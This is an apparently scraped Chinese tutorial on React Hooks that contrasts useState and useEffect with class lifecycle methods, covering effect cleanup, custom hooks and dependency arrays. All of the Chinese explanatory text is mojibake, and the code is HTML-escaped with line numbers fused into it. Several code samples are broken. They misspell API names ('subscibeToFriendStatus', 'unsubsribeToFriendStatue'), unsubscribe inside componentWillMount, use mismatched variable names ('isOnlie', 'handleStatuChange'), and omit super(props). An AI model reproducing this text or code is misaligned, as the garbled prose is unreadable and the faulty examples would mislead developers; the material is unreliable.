setIsOnline(status.isOnline) &#125; useEffect(()=&gt;&#123; ChatAPI.subscribeToFrinedStatus(props.friend.id,handleStatusChange) return()=&gt;&#123; ChatAPI.unsubscribeFromFriendStatus(props.friend.id,handleStatusChange) &#125; &#125;) if(isOnline === null)&#123; return 'Loading ...' &#125; return isOnline ? 'Online' : 'Offline'&#125; ä¸Šé¢çš„å®žä¾‹ä¸­ï¼ŒReactä¼šåœ¨ç»„ä»¶é”€æ¯æˆ–è€…åŽç»­æ¸²æŸ“æ—¶é‡æ–°æ‰§è¡Œå‰¯ä½œç”¨å‡½æ•°ï¼Œå–æ¶ˆå¯¹ ChatAPIçš„è®¢é˜…ã€‚ è·Ÿ useStateä¸€æ ·ï¼Œå¯ä»¥åœ¨ç»„ä»¶ä¸­å¤šæ¬¡ä½¿ç”¨ useEffect 12345678910111213141516function FriendStatusWithCounter(props)&#123; const [count,setCount] = useState(0) useEffect(()=&gt;&#123; document.title = `You clicked $&#123;count&#125; times` &#125;) const [isOnline,setIsOnline] = useState(null) useEffect(()=&gt;&#123; ChatAPI.subscribeToFriendStatus(props.friend.id,handleStatusChange) return()=&gt;&#123; ChatAPI.subscribeFromFriendStatus(props.friend.id,handleStatusChange) &#125; &#125;) function handleStatusChange(status)&#123; setIsOnline(status.isOnline) &#125;&#125; é€šè¿‡ä½¿ç”¨ Hook,å¯ä»¥æŠŠç»„ä»¶å†…ç›¸å…³çš„å‰¯ä½œç”¨ç»„ç»‡åœ¨ä¸€èµ·ï¼ˆä¾‹å¦‚åˆ›å»ºè®¢é˜…ä»¥åŠåŠæ—¶å–æ¶ˆï¼‰ï¼Œè€Œä¸è¦æŠŠå®ƒä»¬æ‹†åˆ†åˆ°ä¸åŒçš„ç”Ÿå‘½å‘¨æœŸå‡½æ•° Hookä½¿ç”¨è§„åˆ™Hook å°±æ˜¯ javascript å‡½æ•°ï¼Œä½†æ˜¯ä½¿ç”¨å®ƒä»¬ä¼šæœ‰ä¸¤ä¸ªé¢å¤–çš„è§„åˆ™ï¼š åªèƒ½åœ¨å‡½æ•°æœ€å¤–å±‚è°ƒç”¨Hookã€‚ä¸è¦åœ¨å¾ªçŽ¯ã€æ¡ä»¶åˆ¤æ–­æˆ–è€…å­å‡½æ•°ä¸­è°ƒç”¨ åªèƒ½åœ¨React çš„å‡½æ•°ç»„ä»¶ä¸­è°ƒç”¨Hookã€‚ è‡ªå®šä¹‰ Hookåœ¨ä¹‹å‰ï¼Œç»„ä»¶ä¹‹é—´å¤ç”¨ä¸€äº›çŠ¶æ€é€»è¾‘ï¼Œæœ‰ä¸¤ç§ä¸»æµæ–¹æ¡ˆï¼šé«˜é˜¶ç»„ä»¶ã€render propsã€‚è‡ªå®šä¹‰ Hookå¯ä»¥åœ¨ä¸å¢žåŠ ç»„ä»¶çš„æƒ…å†µä¸‹è¾¾åˆ°ç›¸åŒçš„ç›®çš„ FriendStatusç»„ä»¶ï¼Œé€šè¿‡è°ƒç”¨ useStateå’Œ useEffectçš„ Hook æ¥è®¢é˜…ä¸€ä¸ªå¥½å‹çš„åœ¨çº¿çŠ¶æ€ï¼Œå‡è®¾æˆ‘ä»¬æƒ³åœ¨å¦ä¸€ä¸ªç»„ä»¶é‡Œå¤ç”¨è¿™ä¸ªè®¢é˜…é€»è¾‘ é¦–å…ˆï¼ŒæŠŠé€»è¾‘æå–åˆ°ä¸€ä¸ªå«åš useFriendStatusçš„è‡ªå®šä¹‰ Hooké‡Œï¼š 12345678910111213141516import React,&#123;useState,useEffect&#125; from 'react'function useFriendStatus(friendID)&#123; const [isOnline,setIsOnline] = useState(null) function handleStatusChange(status)&#123; setIsOnline(status.isOnline) &#125; useEffect(()=&gt;&#123; ChatAPI.subscribeToFriendStatus(friendID,handleStatusChange) return()=&gt;&#123; ChatAPI.unsubscribeFromFriendStatus(friendID,handleStatusChange) &#125; &#125;) return isOnline&#125; å®ƒå°† friendIDä½œä¸ºå‚æ•°ï¼Œå¹¶è¿”å›žè¯¥å¥½å‹æ˜¯å¦åœ¨çº¿ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ä¸¤ä¸ªç»„ä»¶ä¸­ç”¨åˆ°å®ƒï¼š 12345678910111213141516function FriendStatus(props)&#123; const isOnline = useFriendStatus(props.friend.id) if(isOnline === null)&#123; return 'Loading' &#125; return isOnline ? 'Online' : 'Offline';&#125;function FriendListItem(props)&#123; const isOnlie = useFriendStatus(props.friend.id) return( &lt;li style=&#123;&#123;color:isOnline?'green':'black'&#125;&#125;&gt; &#123;props.friend.name&#125; &lt;/li&gt; )&#125; ä¸¤ä¸ªç»„ä»¶ä¸­çš„ state æ˜¯å®Œå…¨ç‹¬ç«‹çš„ã€‚Hook æ˜¯ä¸€ç§å¤ç”¨çŠ¶æ€é€»è¾‘çš„æ–¹å¼ï¼Œä¸å¤ç”¨ state æœ¬èº«ï¼Œäº‹å®žä¸Šï¼ŒHook æ¯æ¬¡è°ƒç”¨éƒ½æœ‰ä¸€ä¸ªå®Œå…¨ç‹¬ç«‹çš„ state,å› æ­¤å¯ä»¥åœ¨å•ä¸ªç»„ä»¶ä¸­å¤šæ¬¡è°ƒç”¨åŒä¸€ä¸ªè‡ªå®šä¹‰ Hook å…¶ä»–Hookè¿˜æœ‰ä¸€äº›ä½¿ç”¨é¢‘çŽ‡è¾ƒä½Žçš„ä½†å¾ˆæœ‰ç”¨çš„ Hookï¼Œæ¯”å¦‚ä½¿ç”¨ useContextå¯ä»¥ä¸ä½¿ç”¨ç»„ä»¶åµŒå¥—è®¢é˜… React çš„ Context 123456789function Example()&#123; const locale = useContext(localeContext) const theme = useContext(ThemeContext) // ..&#125;// useReducer é€šè¿‡ reducer æ¥ç®¡ç†ç»„ä»¶æœ¬åœ°å¤æ‚çš„ statefunction Todos()&#123; const [todos,dispatch] = useReducer(todosReducer)&#125; ä½¿ç”¨ State Hook12345678910111213141516171819202122232425262728293031323334// class ç¤ºä¾‹class Example extends React.Component&#123; constructor(props)&#123; super(props) // 1. æž„é€ å‡½æ•°ä¸­è®¾ç½®æ¥åˆå§‹åŒ– count this.state = &#123; count:0 &#125; &#125; render()&#123; return( &lt;div&gt; &lt;p&gt;You click &#123;this.state.count&#125; times&lt;/p&gt; &lt;button onClick=&#123;()=&gt;this.setState(&#123;count:this.state.count+1&#125;)&#125;&gt; Click me &lt;/button&gt; &lt;/div&gt; ) &#125;&#125;// hookç¤ºä¾‹import React,&#123;useState&#125; from 'react'function Example()&#123; // 1. å‡½æ•°ç»„ä»¶ä¸­æ²¡æœ‰this,ä¸èƒ½åˆ†é…æˆ–è€…è¯»å–this.state,ç›´æŽ¥è°ƒç”¨ useState // 2. useStateå®šä¹‰äº†ä¸€ä¸ª stateå˜é‡ã€‚éœ€è¦ä¸ºä¸€ä¸ªå‚æ•°åˆå§‹stateï¼Œå‚æ•°å¯ä»¥æ˜¯æ•°å­—å­—ç¬¦ä¸²æˆ–è€…å¯¹è±¡ã€‚è¿”å›žå€¼ä¸ºå½“å‰stateä»¥åŠæ›´æ–°stateçš„å‡½æ•°ã€‚ const [count,setCount] = useState(0) return( &lt;div&gt; &lt;p&gt;You click &#123;count&#125; times&lt;/p&gt; &lt;button onClick=&#123;()=&gt;setCount(count+1)&#125;&gt;&lt;/button&gt; &lt;/div&gt; )&#125; Hookå’Œå‡½æ•°ç»„ä»¶12345678const Example = (props)=&gt;&#123; // åœ¨è¿™é‡Œå¯ä»¥ä½¿ç”¨ Hook return &lt;div /&gt; &#125;function Example(props)&#123; // è¿™é‡Œå¯ä»¥ä½¿ç”¨ Hook return &lt;div /&gt;&#125; Hook åœ¨ class å†…éƒ¨æ˜¯ä¸èµ·ä½œç”¨çš„ï¼Œå¯ä»¥ä½¿ç”¨æ¥æ›¿ä»£ class ä½¿ç”¨ Effect HookEffect Hookå¯ä»¥è®©ä½ åœ¨å‡½æ•°ç»„ä»¶ä¸­æ‰§è¡Œå‰¯ä½œç”¨æ“ä½œ 123456789101112131415161718import React,&#123;useState,useEffect&#125; from 'react'function Example()&#123; const [count,setCount] = useState(0) // ç±»ä¼¼äºŽ componentDidMount å’Œ componentDidUpdateã€componentWillUnmount useEffect(()=&gt;&#123; // ç”¨æµè§ˆå™¨çš„apiæ›´æ–°æ–‡æ¡£æ ‡é¢˜ document.title = `You clicked $&#123;count&#125; times` &#125;) return( &lt;div&gt; &lt;p&gt;You clicked &#123;count&#125; times&lt;/p&gt; &lt;button onClick=&#123;()=&gt;setCount(count+1)&#125;&gt; Click me &lt;/button&gt; &lt;/div&gt; )&#125; æ•°æ®èŽ·å–ï¼Œè®¾ç½®è®¢é˜…ä»¥åŠæ‰‹åŠ¨æ›´æ”¹ React ç»„ä»¶ä¸­çš„ DOM éƒ½å±žäºŽå‰¯ä½œç”¨ã€‚åœ¨ React ç»„ä»¶ä¸­æœ‰ä¸¤ç§å¸¸è§å‰¯ä½œç”¨æ“ä½œï¼šéœ€è¦æ¸…é™¤çš„å’Œä¸éœ€è¦æ¸…é™¤çš„ã€‚ æ— éœ€æ¸…é™¤çš„ effectæœ‰æ—¶å€™ï¼Œæˆ‘ä»¬åªæƒ³åœ¨ React æ›´æ–°DOM ä¹‹åŽè¿è¡Œä¸€äº›é¢å¤–çš„ä»£ç ï¼Œæ¯”å¦‚ç½‘ç»œè¯·æ±‚ã€æ‰‹åŠ¨å˜æ›´ DOM,è®°å½•æ—¥å¿—ï¼Œè¿™äº›éƒ½æ˜¯å¸¸è§çš„æ— éœ€æ¸…é™¤çš„æ“ä½œã€‚å› ä¸ºæˆ‘ä»¬åœ¨æ‰§è¡Œå®Œè¿™äº›æ“ä½œä¹‹åŽï¼Œå°±å¯ä»¥å¿½ç•¥ä»–ä»¬äº†ã€‚ ä½¿ç”¨classåœ¨ React çš„ class ç»„ä»¶ä¸­ï¼Œrenderå‡½æ•°æ˜¯ä¸åº”è¯¥æœ‰ä»»ä½•å‰¯ä½œç”¨çš„ï¼Œä¸€èˆ¬æ¥è¯´ï¼Œåœ¨è¿™é‡Œæ‰§è¡Œæ“ä½œå¤ªæ—©äº†ï¼Œæˆ‘ä»¬éƒ½å¸Œæœ›åœ¨ React æ›´æ–° DOM ä¹‹åŽæ‰æ‰§è¡Œæˆ‘ä»¬çš„æ“ä½œ è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆæŠŠå‰¯ä½œç”¨æ”¾åœ¨ componentDidMountå’ŒcomponentDidUpdateå‡½æ•°ä¸­ã€‚ ä¸‹é¢çš„ç¤ºä¾‹ï¼ŒReact è®¡æ•°å™¨çš„ class ç»„ä»¶ï¼Œåœ¨ React å¯¹ DOM è¿›è¡Œæ“ä½œåŽï¼Œç«‹å³æ›´æ–°äº† document çš„ title å±žæ€§ 12345678910111213141516171819202122232425262728class Example extends React.Component&#123; constructor(props)&#123; super(props) this.state = &#123; count:0 &#125; &#125; componentDidMount()&#123; document.title = `You clicked $&#123;this.state.count&#125; times` &#125; componentDidUpdate()&#123; document.title = `You clicked $&#123;this.state.count&#125; times` &#125; render()&#123; return( &lt;div&gt; &lt;p&gt;You clicked &#123;this.state.count&#125; times&lt;/p&gt; &lt;button onClick=&#123;()=&gt;this.setState(&#123;count:this.state.count+1&#125;)&#125;&gt; Click me &lt;/button&gt; &lt;/div&gt; ) &#125;&#125;// åœ¨ class ä¸­ï¼Œæˆ‘ä»¬éœ€è¦åœ¨ä¸¤ä¸ªå£°æ˜Žå‘¨æœŸå‡½æ•°ä¸­ç¼–å†™é‡å¤ä»£ç ï¼Œå¾ˆå¤šæƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¸Œæœ›åœ¨ç»„ä»¶åŠ è½½å’Œæ›´æ–°æ—¶æ‰§è¡ŒåŒæ ·çš„æ“ä½œã€‚ä»Žæ¦‚å¿µä¸Šï¼Œæˆ‘ä»¬å¸Œæœ›æ¯æ¬¡æ¸²æŸ“åŽæ‰§è¡Œ-ä½†æ˜¯Reactçš„classç»„ä»¶æ²¡æœ‰æä¾›è¿™æ ·çš„æ–¹æ³•ï¼Œå³ä½¿æˆ‘ä»¬æå–å‡ºæ¥ï¼Œè¿˜æ˜¯è¦åœ¨ä¸¤ä¸ªåœ°æ–¹è°ƒç”¨å®ƒ ä½¿ç”¨hook123456789101112131415161718192021import React,&#123;useState,useEffect&#125; from 'react'function Example()&#123; const [count,setCount] = useState(0); useEffect(()=&gt;&#123; document.title = `You click $&#123;count&#125; times` &#125;) return( &lt;div&gt; &lt;p&gt;You click &#123;count&#125; times&lt;/p&gt; &lt;button onClick=&#123;()=&gt;setCount(count+1)&#125;&gt; Click me &lt;/button&gt; &lt;/div&gt; )&#125;// 1. useEffect å‘Šè¯‰React ç»„ä»¶éœ€è¦åœ¨æ¸²æŸ“åŽæ‰§è¡ŒæŸäº›æ“ä½œã€‚ä¼šä¿å­˜ä¼ é€’çš„å‡½æ•°ï¼Œå¹¶ä¸”åœ¨æ‰§è¡Œ DOMæ›´æ–°ä¹‹åŽè°ƒç”¨å®ƒã€‚åœ¨è¿™ä¸ª effect ä¸­ï¼Œæˆ‘ä»¬è®¾ç½®äº† document çš„ title å±žæ€§ï¼Œä¸è¿‡æˆ‘ä»¬ä¹Ÿå¯ä»¥æ‰§è¡Œæ•°æ®èŽ·å–æˆ–è€…è°ƒç”¨å…¶ä»–å‘½ä»¤çš„ API// 2. å°† useEffect æ”¾åœ¨ç»„ä»¶å†…éƒ¨è®©æˆ‘ä»¬å¯ä»¥åœ¨ effect ä¸­ç›´æŽ¥è®¿é—® count state å˜é‡æˆ–è€…å…¶ä»– props.æˆ‘ä»¬ä¸éœ€è¦ç‰¹æ®Šçš„APIæ¥è¯»å–å®ƒï¼Œå®ƒå·²ç»ä¿å­˜åœ¨å‡½æ•°ä½œç”¨åŸŸä¸­ã€‚Hook ä½¿ç”¨äº† jsçš„é—­åŒ…æœºåˆ¶ï¼Œè€Œä¸ç”¨åœ¨jså·²ç»æä¾›äº†è§£å†³æ–¹æ¡ˆçš„æƒ…å†µä¸‹ï¼Œè¿˜å¼•å…¥ç‰¹å®šçš„React API// 3. useEffectä¼šåœ¨æ¯æ¬¡æ¸²æŸ“åŽéƒ½æ‰§è¡Œï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œå®ƒåœ¨ç¬¬ä¸€æ¬¡æ¸²æŸ“ä¹‹åŽå’Œæ¯æ¬¡æ›´æ–°ä¹‹åŽéƒ½ä¼šæ‰§è¡Œï¼Œä¸ç”¨åŽ»è€ƒè™‘æŒ‚è½½è¿˜æ˜¯æ›´æ–°ï¼ŒReactä¿è¯äº†æ¯æ¬¡è¿è¡Œ effectçš„åŒæ—¶ï¼ŒDOMéƒ½å·²ç»æ›´æ–°å®Œæ¯•äº† ä¸Ž componentDidMount å’Œ componentDidUpdateä¸åŒï¼Œä½¿ç”¨ useEffect è°ƒåº¦çš„ effect ä¸ä¼šé˜»å¡žæµè§ˆå™¨æ›´æ–°å±å¹•ï¼Œè®©åº”ç”¨çœ‹èµ·æ¥å“åº”å¾ˆå¿«ã€‚å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œeffectä¸éœ€è¦åŒæ­¥åœ°æ‰§è¡Œï¼Œåœ¨ä¸ªåˆ«æƒ…å†µä¸‹ï¼ˆä¾‹å¦‚æµ‹è¯•å¸ƒå±€ï¼‰ï¼Œæœ‰å•ç‹¬çš„ useLayoutEffect Hook ä½¿ç”¨ éœ€è¦æ¸…é™¤çš„ effectè®¢é˜…å¤–éƒ¨æ•°æ®æºç­‰ä¸€äº›å‰¯ä½œç”¨æ˜¯éœ€è¦æ¸…é™¤çš„ï¼Œå¯ä»¥é˜²æ­¢å†…å­˜æ³„éœ²ã€‚ ä½¿ç”¨classé€šå¸¸ä¼šåœ¨ componentDidMountä¸­è®¾ç½®è®¢é˜…ï¼Œåœ¨ componentWillMountä¸­æ¸…é™¤å®ƒã€‚å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ª ChatApIæ¨¡å—ï¼Œè¿è¡Œæˆ‘ä»¬è®¢é˜…å¥½å‹çš„åœ¨çº¿çŠ¶æ€ 1234567891011121314151617181920212223242526272829303132class FriendStatus extends React.Component&#123; constructor(props)&#123; this.state = &#123; isOnline:null &#125; this.handleStatusChange = this.handleStatusChange.bind(this) &#125; componentDidMount()&#123; ChatAPI.subsribeToFriendStatus( this.props.friend.id, this.handleStatusChange ) &#125; componentWillMount()&#123; ChatAPI.unsubsribeToFriendStatue( this.props.friend.id, this.handleStatusChange ) &#125; handleStatusChange(status)&#123; this.setState(&#123; isOnline:status.isOnline &#125;) &#125; render()&#123; if(this.state.isOnline === null)&#123; return 'Loading...' &#125; return this.state.isOnline ? 'ONline' : 'Offline' &#125;&#125; ä½¿ç”¨hookuseEffect è®¾è®¡åœ¨åŒä¸€ä¸ªåœ°æ–¹æ‰§è¡Œæ·»åŠ å’Œåˆ é™¤è®¢é˜…ï¼Œeffectè¿”å›žä¸€ä¸ªå‡½æ•°ï¼ŒReactå°±ä¼šåœ¨æŒ‡å®šæ¸…é™¤çš„æ—¶å€™è°ƒç”¨å®ƒ 1234567891011121314151617181920212223import React,&#123;useState,useEffect&#125; from 'react'function FriendStatus(props)&#123; const [isOnline,setIsOnline] = useState(null) useEffect(()=&gt;&#123; function handleStatusChange(status)&#123; setIsOnline(status.isOnline) &#125; ChatAPI.subscribeToFriendStatus(props.friend.id,handleStatusChange) return function cleanup()&#123; ChatAPI.unsubscribeFromFriendStatus(props.friend.id,handleStatuChange) &#125; &#125;) if(isOnline === null)&#123; return 'Loading...' &#125; return isOnline ? 'Online' : 'Offline'&#125;// 1. effectè¿”å›žä¸€ä¸ªå‡½æ•°ï¼Œè¿™æ˜¯ effect å¯é€‰çš„æ¸…é™¤æœºåˆ¶ï¼Œæ¯ä¸ª effect éƒ½å¯ä»¥è¿”å›žä¸€ä¸ªæ¸…é™¤å‡½æ•°ã€‚æ‰€ä»¥å¯ä»¥å°†æ·»åŠ å’Œè®¢é˜…çš„é€»è¾‘æ”¾åœ¨ä¸€èµ·ï¼Œéƒ½å±žäºŽ effectçš„ä¸€éƒ¨åˆ†// 2. React ä¼šåœ¨ç»„ä»¶å¸è½½çš„æ—¶å€™æ‰§è¡Œæ¸…é™¤æ“ä½œï¼Œeffectåœ¨æ¯æ¬¡æ¸²æŸ“çš„æ—¶å€™éƒ½ä¼šæ‰§è¡Œã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆ React ä¼šåœ¨æ‰§è¡Œå½“å‰ effect ä¹‹å‰å¯¹ä¸Šä¸€ä¸ª effect è¿›è¡Œæ¸…é™¤// 3.å¹¶ä¸æ˜¯å¿…é¡»ä¸º effect è¿”å›žçš„å‡½æ•°å‘½åï¼Œä¸Šé¢å‘½ä»¤æ˜¯ä¸ºäº†è¡¨æ˜Žæ­¤å‡½æ•°çš„ç›®çš„ï¼Œå¯ä»¥è¿”å›žä¸€ä¸ªç®­å¤´å‡½æ•°æˆ–è€…å¦ä¸€ä¸ªåå­— ä½¿ç”¨å¤šä¸ªEffect å®žçŽ°å…³æ³¨ç‚¹åˆ†ç¦»ä½¿ç”¨hookå…¶ä¸­ä¸€ä¸ªç›®çš„å°±æ˜¯è¦è§£å†³class ä¸­å£°æ˜Žå‘¨æœŸå‡½æ•°ç»å¸¸åŒ…å«ä¸ç›¸å…³çš„é€»è¾‘ï¼Œä½†åˆæŠŠç›¸å…³é€»è¾‘åˆ†ç¦»åˆ°äº†å‡ ä¸ªä¸åŒæ–¹æ³•ä¸­çš„é—®é¢˜ã€‚ä¸Šé¢ä»£ç æ˜¯ç¤ºä¾‹ä¸­è®¡æ•°å™¨å’Œå¥½å‹çŠ¶æ€æŒ‡ç¤ºå™¨é€»è¾‘ç»„åˆåœ¨ä¸€èµ·çš„ç»„ä»¶ï¼š 123456789101112131415161718192021222324252627282930313233class FriendStatusWithCounter extends React.Component&#123; constructor(props)&#123; super(props); this.state = &#123; count:0, isOnline:null &#125; this.handleStatusChange = this.handleStatusChange.bind(this) &#125; componentDidMount()&#123; document.title = `You click $&#123;this.state.count&#125; times` ChatAPI.subscribeToFriendStatus( this.props.friend.id, this.handleStatusChange ) &#125; componentDidUpdate()&#123; document.title = `You click $&#123;this.state.count&#125; times` &#125; componentWillUnmount()&#123; ChatAPI.unsubscibeFromFriendStatus( this.props.friend.id, this.handleStatusChange ) &#125; handleStatusChange(status)&#123; this.setState(&#123; isOnline:status.inOnline &#125;) &#125;&#125;// å¯ä»¥å‘çŽ°è®¾ç½® documnet.title çš„é€»è¾‘æ˜¯å¦‚ä½•è¢«åˆ†å‰²åˆ° componentDidMount å’Œ componentDidUpdateä¸­ã€‚è®¢é˜…é€»è¾‘æ˜¯è¢«åˆ†å‰²åˆ° componentDidMount å’Œ componentWillUnmount ä¸­ã€‚è€Œä¸” componentDidMount ä¸­åŒ…å«äº†ä¸¤ä¸ªä¸åŒåŠŸèƒ½çš„ä»£ç  è€Œä½¿ç”¨ hook,è·Ÿä½¿ç”¨å¤šä¸ª state çš„ hookä¸€æ ·ï¼Œå¯ä»¥ä½¿ç”¨å¤šä¸ª effectå°†ä¸ç›¸å…³é€»è¾‘åˆ†ç¦»åˆ°ä¸åŒçš„ effectä¸­ 1234567891011121314151617function FriendStatusWithCounter(props)&#123; const [count,setCount] = useState(0) useEffect(()=&gt;&#123; document.title = `You clicked $&#123;count&#125; times` &#125;) const [isOnline,setIsOnline] = useState(null) useEffect(()=&gt;&#123; function handleStatusChange(status)&#123; setIsOnline(status.isOnline) &#125; ChatAPI.subscribeToFriendStatus(props.friend.id,handleStatusChange) return ()=&gt;&#123; ChatAPI.unsubcribeFromFriendStatus(props.friend.id,handleStatusChange) &#125; &#125;)&#125;// hook å…è®¸æˆ‘ä»¬æŒ‰ç…§ä»£ç çš„ç”¨é€”åˆ†ç¦»ä»–ä»¬ï¼Œè€Œä¸æ˜¯åƒç”Ÿå‘½å‘¨æœŸå‡½æ•°é‚£æ ·ï¼ŒReact å°†æŒ‰ç…§ effect å£°æ˜Žçš„é¡ºåºä¾æ¬¡è°ƒç”¨ç»„ä»¶ä¸­çš„æ¯ä¸€ä¸ª effect ä¸ºä»€ä¹ˆæ¯æ¬¡æ›´æ–°çš„æ—¶å€™éƒ½è¦è¿è¡Œeffectä¸ºä»€ä¹ˆ effect åœ¨æ¯æ¬¡é‡æ¸²æŸ“éƒ½ä¼šæ‰§è¡Œï¼Œè€Œä¸æ˜¯åœ¨å¸è½½ç»„ä»¶çš„æ—¶å€™æ‰§è¡Œä¸€æ¬¡ã€‚ ä¸Šè¿°ç”¨äºŽæ˜¾ç¤ºå¥½å‹æ˜¯å¦åœ¨çº¿çš„ FriendStatus ç»„ä»¶ï¼Œä»Ž class ä¸­ props è¯»å– friend.idï¼Œç„¶åŽåœ¨ç»„ä»¶æŒ‚è½½åŽè®¢é˜…å¥½å‹çŠ¶æ€ï¼Œå¹¶åœ¨å¸è½½ç»„ä»¶çš„æ—¶å€™å–æ¶ˆè®¢é˜… 1234567891011121314151617181920212223242526componentDidMount()&#123; ChatAPI.subscribeToFriendStatus( this.props.friend.id, this.handleStatusChange ); &#125;componentWillUnmount()&#123; ChatAPI.unsubscribeFromFriendStatus( this.props.friend.id, this.handleStatusChange ); &#125;// è¿™é‡Œä¼šæœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå½“ç»„ä»¶å·²ç»æ˜¾ç¤ºåœ¨å±å¹•ä¸Šæ—¶ï¼Œfriend propså‘ç”Ÿå˜åŒ–ï¼Œæˆ‘ä»¬çš„ç»„ä»¶å°†ç»§ç»­å±•ç¤ºåŽŸæ¥çš„å¥½å‹çŠ¶æ€ï¼Œè¿™æ˜¯ä¸€ä¸ª bug,è€Œä¸”æˆ‘ä»¬è¿˜ä¼šå› ä¸ºå–æ¶ˆè®¢é˜…æ—¶é”™è¯¯ä½¿ç”¨é”™è¯¯çš„å¥½å‹ ID,å¯¼è‡´å†…å­˜æ³„éœ²æˆ–è€…å¥”æºƒçš„é—®é¢˜// æ‰€ä»¥é€šè¿‡æ·»åŠ  componentDidUpdate æ¥è§£å†³è¿™ä¸ªé—®é¢˜componentDidUpdate(prevProps)&#123; // å–æ¶ˆä¹‹å‰çš„è®¢é˜…çš„ friend.id ChatAPI.unsubscibeFromFriendStatus( prevProps.friend.id, this.handleStatusChange ) // è®¢é˜…æ–°çš„ friend.id ChatAPI.subscribeToFriendStatus( this.props.friend.id, this.handleStatusChange )&#125; Hookç‰ˆæœ¬ 12345678function FriendStatus(props)&#123; useEffect(()=&gt;&#123; ChatAPI.subscribeToFriendStatus(props.friend.id,handleStatusChange) return ()=&gt;&#123; ChatAPI.unsubscibeFromFriendStatus(props.friend.id,handleStatusChange) &#125; &#125;)&#125; ä¸éœ€è¦ç‰¹å®šçš„ä»£ç æ¥å¤„ç†æ›´æ–°é€»è¾‘ï¼ŒuseEffecté»˜è®¤å°±ä¼šå¤„ç†ã€‚å®ƒä¼šåœ¨è°ƒç”¨ä¸€ä¸ªæ–°çš„ effect ä¹‹å‰å¯¹å‰ä¸€ä¸ª effect è¿›è¡Œæ¸…ç†ã€‚ä¸‹é¢æŒ‰æ—¶é—´åˆ—å‡ºä¸€ä¸ªå¯èƒ½ä¼šäº§ç”Ÿçš„è®¢é˜…å’Œå–æ¶ˆè®¢é˜…è°ƒç”¨åºåˆ— 12345678910// Mount with &#123;friend:&#123;id:100&#125;&#125; propsChatAPI.subscibeToFriendStatus(100,handleStatusChange) // è¿è¡Œç¬¬ä¸€ä¸ª effect// Mount with &#123;friend:&#123;id:200&#125;&#125; propsChatAPI.unsubscribeFromFriendStatus(100,handleStatusChange) // æ¸…é™¤ä¸Šä¸€ä¸ª effectChatAPI.subscibeToFriendStatus(200,handleStatusChange) // è¿è¡Œä¸‹ä¸€ä¸ª effect// Mount with &#123;friend:&#123;id:300&#125;&#125; propsChatAPI.unsubscribeFromFriendStatus(200,handleStatusChange) // æ¸…é™¤ä¸Šä¸€ä¸ª effectChatAPI.subscibeToFriendStatus(300,handleStatusChange) // è¿è¡Œä¸‹ä¸€ä¸ª effect// unMountChatAPI.unsubscribeFromFriendStatus(300,handleStatusChange) // æ¸…é™¤ä¸Šä¸€ä¸ª effect é»˜è®¤è¡Œä¸ºä¿è¯äº†ä¸€è‡´æ€§ï¼Œé¿å…äº†åœ¨ class ç»„ä»¶å› ä¸ºæ²¡æœ‰å¤„ç†æ›´æ–°é€»è¾‘è€Œå¯¼è‡´å¸¸è§ bug é€šè¿‡è·³è¿‡ effect è¿›è¡Œæ€§èƒ½ä¼˜åŒ–åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œæ¯æ¬¡æ¸²æŸ“åŽéƒ½ä¼šæ‰§è¡Œæ¸…ç†æˆ–è€…æ‰§è¡Œ effect å¯èƒ½ä¼šå¯¼è‡´æ€§èƒ½é—®é¢˜ã€‚åœ¨ class ç»„ä»¶ä¸­ï¼Œå¯ä»¥é€šè¿‡ componentDidUpate ä¸­æ·»åŠ  prevProps æˆ–è€… prevState çš„æ¯”è¾ƒé€»è¾‘è§£å†³ï¼š 12345componentDidUpdate(prevProps,prevState)&#123; if(prevState.count !== this.state.count)&#123; document.title = `You clicked $&#123;this.state.count&#125; times` &#125;&#125; è¿™æ˜¯å¾ˆå¸¸è§çš„éœ€æ±‚ï¼Œè¢«å†…ç½®åˆ°äº† useEffect çš„ hook apiä¸­ï¼Œå¦‚æžœæŸäº›ç‰¹å®šå€¼åœ¨ä¸¤æ¬¡é‡æ¸²æŸ“ä¸­æ²¡æœ‰å‘ç”Ÿå˜åŒ–ï¼Œå¯ä»¥é€šè¿‡ React è·³è¿‡å¯¹ effect çš„è°ƒç”¨ï¼Œåªè¦ä¼ é€’æ•°ç»„ä½œä¸º useEffect çš„ç¬¬äºŒä¸ªå‚æ•°å³å¯ï¼š 12345678910111213useEffect(()=&gt;&#123; document.title = `You clicked $&#123;count&#125; times`&#125;,[count]) // ä»…åœ¨ count æ›´æ”¹çš„æ—¶å€™æ›´æ–°// å¯¹äºŽæœ‰æ¸…é™¤æ“ä½œçš„ effectåŒæ ·é€‚ç”¨useEffect(()=&gt;&#123; function handleStatusChange(status)&#123; setIsOnline(status.isOnline) &#125; ChatAPI.subscibeToFriendStatus(props.friend.id,handleStatusChange) return()=&gt;&#123; ChatAPI.unsubscibeFromFriendStatus(props.friend.id,handleStatusChange) &#125;&#125;,[props.friend.id]) // ä»…åœ¨ props.friend.id å‘ç”Ÿå˜åŒ–æ—¶ï¼Œé‡æ–°è®¢é˜… æ³¨æ„ï¼š å¦‚æžœè¦ä½¿ç”¨è¿™ç§ä¼˜åŒ–æ–¹æ³•ï¼Œç¡®ä¿æ•°ç»„ä¸­åŒ…å«äº†æ‰€æœ‰å¤–éƒ¨ä½œç”¨åŸŸä¸­ä¼šéšç€æ—¶é—´å˜åŒ–å¹¶ä¸”åœ¨ effect ä¸­ä½¿ç”¨çš„å˜é‡ï¼Œå¦åˆ™ä»£ç ä¼šå¼•ç”¨åˆ°å…ˆå‰æ¸²æŸ“ä¸­çš„æ—§å˜é‡ã€‚ å¦‚æžœæƒ³åªæ‰§è¡Œä¸€æ¬¡ effect ä»…åœ¨ç»„ä»¶æŒ‚è½½æˆ–è€…å¸è½½æ—¶æ‰§è¡Œï¼Œå¯ä»¥ä¼ é€’ä¸€ä¸ªç©ºæ•°ç»„ï¼ˆ[]ï¼‰ï¼Œä½œä¸ºç¬¬äºŒä¸ªå‚æ•°ï¼Œå‘Šè¯‰ React çš„ effect ä¸ä¾èµ–äºŽprops æˆ–è€… state 